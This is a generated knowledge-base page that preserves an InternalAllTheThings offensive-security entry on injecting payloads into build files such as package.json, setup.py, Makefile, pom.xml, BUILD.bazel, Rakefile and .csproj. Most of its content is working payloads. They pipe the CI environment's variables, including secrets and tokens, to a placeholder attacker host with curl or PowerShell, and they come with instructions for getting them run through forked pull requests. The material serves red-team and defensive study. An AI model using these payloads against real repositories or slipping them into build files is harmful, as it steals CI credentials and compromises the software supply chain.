---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Package Managers and Build Files

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-devops-package-managers` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/devops/package-managers.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Package Managers and Build Files](../../topics/devops/package-managers-and-build-files.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-devops-package-managers |
| name | Package Managers and Build Files |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/devops/package-managers.md |

## Preserved Source Material

````yaml
_body: "# Package Managers and Build Files\n\n> Code injections into build files are CI agnostic and therefore they make great\
  \ targets when you don't know what system builds the repository, or if there are multiple CI's in the process. In the examples\
  \ below you need to either replace the files with the sample payloads, or inject your own payloads into existing files by\
  \ editing just a part of them. If the CI builds forked pull requests then your payload may run in the CI.\n\n## Summary\n\
  \n- [Javascript / Typescript - package.json](#javascript--typescript---packagejson)\n- [Python - setup.py](#python---setuppy)\n\
  - [Bash / sh - *.sh](#bash--sh---sh)\n- [Maven / Gradle](#maven--gradle)\n- [BUILD.bazel](#buildbazel)\n- [Makefile](#makefile)\n\
  - [Rakefile](#rakefile)\n- [C# - *.csproj](#c---csproj)\n\n## Javascript / Typescript - package.json\n\nThe `package.json`\
  \ file is used by many Javascript / Typescript package managers (`yarn`,`npm`,`pnpm`,`npx`....).\n\nThe file may contain\
  \ a `scripts` object with custom commands to run.\\\n`preinstall`, `install`, `build` & `test` are often executed by default\
  \ in most CI/CD pipelines - hence they are good targets for injection.\n\nIf you come across a `package.json` file - edit\
  \ the `scripts` object and inject your instruction there\n\nNOTE: the payloads in the instructions above must be `json escaped`.\n\
  \nExample:\n\n```json\n{\n  \"name\": \"my_package\",\n  \"description\": \"\",\n  \"version\": \"1.0.0\",\n  \"scripts\"\
  : {\n    \"preinstall\": \"set | curl -X POST --data-binary @- {YourHostName}\",\n    \"install\": \"set | curl -X POST\
  \ --data-binary @- {YourHostName}\",\n    \"build\": \"set | curl -X POST --data-binary @- {YourHostName}\",\n    \"test\"\
  : \"set | curl -X POST --data-binary @- {YourHostName}\"\n  },\n  \"repository\": {\n    \"type\": \"git\",\n    \"url\"\
  : \"https://github.com/foobar/my_package.git\"\n  },\n  \"keywords\": [],\n  \"author\": \"C.Norris\"\n}\n```\n\n## Python\
  \ - setup.py\n\n> `setup.py` is used by python's package managers during the build process.\nIt is often executed by default.\\\
  \n> Replacing the setup.py files with the following payload may trigger their execution by the CI.\n\n```python\nimport\
  \ os\n\nos.system('set | curl -X POST --data-binary @- {YourHostName}')\n```\n\n## Bash / sh - *.sh\n\n> Shell scripts in\
  \ the repository are often executed in custom CI/CD pipelines.\\\n> Replacing all the `.sh` files in the repo and submitting\
  \ a pull request may   trigger their execution by the CI.\n\n```shell\nset | curl -X POST --data-binary @- {YourHostName}\n\
  ```\n\n## Maven / Gradle\n\n> These package managers come with \"wrappers\" that help with running custom commands for building\
  \ / testing the project.\\\nThese wrappers are essentially executable shell/cmd scripts.\nReplace them with your payloads\
  \ to have them executed:\n\n- `gradlew`\n- `mvnw`\n- `gradlew.bat` (windows)\n- `mvnw.cmd` (windows)\n\n> Occasionally the\
  \ wrappers will not be present in the repository.\\\n> In such cases you can edit the `pom.xml` file, which instructs maven\
  \ what dependencies to fetch and which `plugins` to run.\\\n> Some plugins allow code execution, here's an example of the\
  \ common plugin `org.codehaus.mojo`.\\\n> If the `pom.xml` file you're targeting already contains a `<plugins>` instruction\
  \ then simply add another `<plugin>` node under it.\\\n> If if **doesn't** contain a `<plugins>` node then add it under\
  \ the `<build>` node.\n\nNOTE: remember that your payload is inserted in an XML document - XML special characters must be\
  \ escaped.\n\n```xml\n<build>\n    <plugins>\n        <plugin>\n          <groupId>org.codehaus.mojo</groupId>\n       \
  \   <artifactId>exec-maven-plugin</artifactId>\n          <version>1.6.0</version>\n          <executions>\n           \
  \   <execution>\n                  <id>run-script</id>\n                  <phase>validate</phase>\n                  <goals>\n\
  \                      <goal>exec</goal>\n                  </goals>\n              </execution>\n          </executions>\n\
  \          <configuration>\n              <executable>bash</executable>\n              <arguments>\n                  <argument>\n\
  \                      -c\n                  </argument>\n                  <argument>{XML-Escaped-Payload}</   argument>\n\
  \              </arguments>\n          </configuration>\n        </plugin>\n    </plugins>\n</build>\n```\n\n## BUILD.bazel\n\
  \n> Replace the content of `BUILD.bazel` with the following payload\n\nNOTE: `BUILD.bazel` requires escaping backslashes.\\\
  \nReplace any `\\` with `\\\\` inside your payload.\n\n```shell\ngenrule(\n    name = \"build\",\n    outs = [\"foo\"],\n\
  \    cmd = \"{Escaped-Shell-Payload}\",\n    visibility = [\"//visibility:public\"],\n)\n```\n\n## Makefile\n\n> Make files\
  \ are often executed by build pipelines for projects written in `C`, `C++` or `Go` (but not exclusively).\\\n> There are\
  \ several utilities that execute `Makefile`, the most common are `GNU Make` & `Make`.\\\n> Replace your target  `Makefile`\
  \ with the following payload\n\n```shell\n.MAIN: build\n.DEFAULT_GOAL := build\n.PHONY: all\nall: \n set | curl -X POST\
  \ --data-binary @- {YourHostName}\nbuild: \n set | curl -X POST --data-binary @- {YourHostName}\ncompile:\n    set | curl\
  \ -X POST --data-binary @- {YourHostName}\ndefault:\n    set | curl -X POST --data-binary @- {YourHostName}\n```\n\n###\
  \ Rakefile\n\n> Rake files are similar to `Makefile` but for Ruby projects.\\\n> Replace your target `Rakefile` with the\
  \ following payload\n\n```shell\ntask :pre_task do\n  sh \"{Payload}\"\nend\n\ntask :build do\n  sh \"{Payload}\"\nend\n\
  \ntask :test do\n  sh \"{Payload}\"\nend\n\ntask :install do\n  sh \"{Payload}\"\nend\n\ntask :default => [:build]\n```\n\
  \n## C# - *.csproj\n\n> `.csproj` files are build file for the `C#` runtime.\n> They are constructed as XML files that contain\
  \ the different dependencies that are required to build the project.\n> Replacing all the `.csproj` files in the repo with\
  \ the following payload may trigger their execution by the CI.\n\nNOTE: Since this is an XML file - XML special characters\
  \ must be escaped.\n\n```powershell\n<Project>\n <Target Name=\"SendEnvVariables\" BeforeTargets=\"Build;BeforeBuild;BeforeCompile\"\
  >\n   <Exec Command=\"powershell -Command &quot;$envBody = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem\
  \ env: | Format-List | Out-String))); Invoke-WebRequest -Uri {YourHostName} -Method POST -Body $envBody&quot;\" />\n </Target>\n\
  </Project>\n```"
_relative_path: devops/package-managers.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/devops/package-managers.md
````
